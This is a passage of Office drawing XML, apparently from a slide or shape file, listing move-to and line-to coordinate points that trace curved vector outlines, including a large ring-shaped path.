                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3533800" y="1619758"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3540163" y="1584071"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3532555" y="1548130"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3511029" y="1516265"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3462642" y="1489430"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3444887" y="1487195"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3492042" y="1465287"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3582657" y="1430388"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3613035" y="1424660"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3667988" y="1438998"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3723119" y="1464995"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3788003" y="1503235"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3803446" y="1501724"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3810863" y="1490370"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
                <a:path w="4740909" h="4737100">
                  <a:moveTo>
                    <a:pt x="4740656" y="2374900"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="4740173" y="2324100"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4738725" y="2273300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4736325" y="2222500"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4732985" y="2184400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4728705" y="2133600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4723511" y="2082800"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4717402" y="2044700"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4710379" y="1993900"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4702454" y="1943100"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4693653" y="1905000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4683976" y="1854200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4673422" y="1803400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4662005" y="1765300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4649736" y="1714500"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4636630" y="1676400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4622685" y="1625600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4607928" y="1587500"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4592345" y="1549400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4575962" y="1498600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4558779" y="1460500"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4540821" y="1422400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4522076" y="1371600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4502556" y="1333500"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4482287" y="1295400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4461268" y="1257300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4439501" y="1219200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4417009" y="1181100"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4393793" y="1143000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4375734" y="1114247"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4375734" y="2374900"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4375162" y="2425700"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4373486" y="2463800"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4370692" y="2514600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4366806" y="2565400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4361853" y="2603500"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4355820" y="2654300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4348721" y="2705100"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4340593" y="2743200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4331436" y="2794000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4321251" y="2844800"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4310062" y="2882900"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4297883" y="2933700"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4284713" y="2971800"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4270591" y="3009900"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4255503" y="3060700"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4239476" y="3098800"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4222521" y="3136900"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4204639" y="3187700"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4185856" y="3225800"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4166184" y="3263900"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4145635" y="3302000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4124210" y="3340100"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4101935" y="3390900"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4078808" y="3429000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4054856" y="3467100"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4030091" y="3492500"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4004526" y="3530600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3978160" y="3568700"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3951020" y="3606800"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3923106" y="3644900"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3894442" y="3670300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3865029" y="3708400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3834892" y="3746500"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3804043" y="3771900"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3772484" y="3810000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3740239" y="3835400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3707307" y="3873500"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3673716" y="3898900"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3639464" y="3924300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3604577" y="3949700"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3569055" y="3975100"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3532924" y="4013200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3496183" y="4038600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3458845" y="4051300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3382467" y="4102100"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3303867" y="4152900"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3263773" y="4165600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3223158" y="4191000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3182048" y="4203700"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3140443" y="4229100"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3012808" y="4267200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2969361" y="4292600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2881198" y="4318000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2836507" y="4318000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2700159" y="4356100"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2653982" y="4356100"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2607475" y="4368800"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2513469" y="4368800"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2466022" y="4381500"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2274481" y="4381500"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2227034" y="4368800"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2133041" y="4368800"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2086533" y="4356100"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2040356" y="4356100"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1904009" y="4318000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1859330" y="4318000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1771167" y="4292600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1727733" y="4267200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1600098" y="4229100"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1558493" y="4203700"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1517370" y="4191000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1476768" y="4165600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1436662" y="4152900"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1358074" y="4102100"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1281684" y="4051300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1244358" y="4038600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1207617" y="4013200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1171486" y="3975100"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1135964" y="3949700"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1101077" y="3924300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1066825" y="3898900"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1033233" y="3873500"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1000302" y="3835400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="968057" y="3810000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="936498" y="3771900"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="905637" y="3746500"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="875499" y="3708400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="846099" y="3670300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="817422" y="3644900"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="789520" y="3606800"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="762368" y="3568700"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="736003" y="3530600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="710438" y="3492500"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="685673" y="3467100"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="661720" y="3429000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="638594" y="3390900"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="616318" y="3340100"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="594893" y="3302000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="574332" y="3263900"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="554659" y="3225800"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="535876" y="3187700"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="518007" y="3136900"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="501040" y="3098800"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="485013" y="3060700"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="469925" y="3009900"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="455803" y="2971800"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="442633" y="2933700"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="430453" y="2882900"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="419265" y="2844800"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="409079" y="2794000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="399923" y="2743200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="391782" y="2705100"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="384695" y="2654300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="378663" y="2603500"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="373697" y="2565400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="369811" y="2514600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="367030" y="2463800"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="365340" y="2425700"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="364782" y="2374900"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="365340" y="2324100"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="367030" y="2273300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="369811" y="2235200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="373697" y="2184400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="378663" y="2133600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="384695" y="2082800"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="391782" y="2044700"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="399923" y="1993900"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="409079" y="1955800"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="419265" y="1905000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="430453" y="1866900"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="442633" y="1816100"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="455790" y="1778000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="469925" y="1727200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="485013" y="1689100"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="501040" y="1638300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="518007" y="1600200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="535876" y="1562100"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="554659" y="1524000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="574332" y="1473200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="594893" y="1435100"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="616318" y="1397000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="638594" y="1358900"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="661720" y="1320800"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="685673" y="1282700"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="710438" y="1244600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="736003" y="1206500"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="762368" y="1168400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="789520" y="1143000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="817422" y="1104900"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="846099" y="1066800"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="875499" y="1028700"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="905637" y="1003300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="936498" y="965200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="968057" y="939800"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1000302" y="901700"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1033233" y="876300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1066825" y="850900"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1101077" y="812800"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1135964" y="787400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1171486" y="762000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1207617" y="736600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1244358" y="711200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1281684" y="685800"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1358074" y="635000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1397101" y="622300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1476768" y="571500"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1517370" y="558800"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1558493" y="533400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1642173" y="508000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1684731" y="482600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1949081" y="406400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1994535" y="406400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2086533" y="381000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2179878" y="381000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2227034" y="368300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2513469" y="368300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2560624" y="381000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2653982" y="381000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2745981" y="406400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2791434" y="406400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3055810" y="482600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3098355" y="508000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3182048" y="533400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3223158" y="558800"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3263773" y="571500"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3343440" y="622300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3382467" y="635000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3458845" y="685800"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3496183" y="711200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3532924" y="736600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3569055" y="762000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3604577" y="787400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3639464" y="812800"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3673716" y="850900"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3707307" y="876300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3740239" y="901700"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3772484" y="939800"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3804043" y="965200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3834892" y="1003300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3865029" y="1028700"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3894442" y="1066800"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3923106" y="1104900"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3951008" y="1143000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3978160" y="1168400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4004526" y="1206500"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4030091" y="1244600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4054856" y="1282700"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4078808" y="1320800"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4101935" y="1358900"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4124210" y="1397000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4145635" y="1435100"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4166184" y="1473200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4185856" y="1524000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4204639" y="1562100"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4222521" y="1600200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4239476" y="1638300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4255503" y="1689100"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4270591" y="1727200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4284713" y="1778000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4297883" y="1816100"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4310062" y="1866900"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4321251" y="1905000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4331436" y="1955800"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4340593" y="1993900"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4348721" y="2044700"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4355820" y="2082800"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4361853" y="2133600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4366806" y="2184400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4370692" y="2235200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4373486" y="2273300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4375162" y="2324100"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4375734" y="2374900"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4375734" y="1114247"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4345229" y="1066800"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4319892" y="1028700"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4293882" y="990600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4267187" y="952500"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4239831" y="914400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4211815" y="876300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4183151" y="850900"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4153839" y="812800"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4123906" y="774700"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4093337" y="749300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4062171" y="711200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4030395" y="685800"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3998023" y="647700"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3965067" y="622300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3931539" y="584200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3897452" y="558800"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3862794" y="533400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3827589" y="508000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3791851" y="469900"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3718788" y="419100"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3643693" y="368300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3605390" y="342900"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3566617" y="330200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3487636" y="279400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3447465" y="254000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3406838" y="241300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3365779" y="215900"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3324288" y="203200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3282378" y="177800"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3154222" y="139700"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3110725" y="114300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2933103" y="63500"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2887827" y="63500"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2750096" y="25400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2703563" y="25400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2656751" y="12700"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2562275" y="12700"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2514638" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2225865" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2178227" y="12700"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2083765" y="12700"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2036953" y="25400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1990420" y="25400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1852688" y="63500"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1807425" y="63500"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1629803" y="114300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1586318" y="139700"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1458175" y="177800"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1416265" y="203200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1374775" y="215900"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1333715" y="241300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1293101" y="254000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1252918" y="279400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1173949" y="330200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1135176" y="342900"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1096886" y="368300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1021778" y="419100"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="948728" y="469900"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="912990" y="508000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="877798" y="533400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="843140" y="558800"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="809053" y="584200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="775525" y="622300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="742569" y="647700"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="710209" y="685800"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="678434" y="711200"/>
                  </a:lnTo>
                  <a:lnTo>
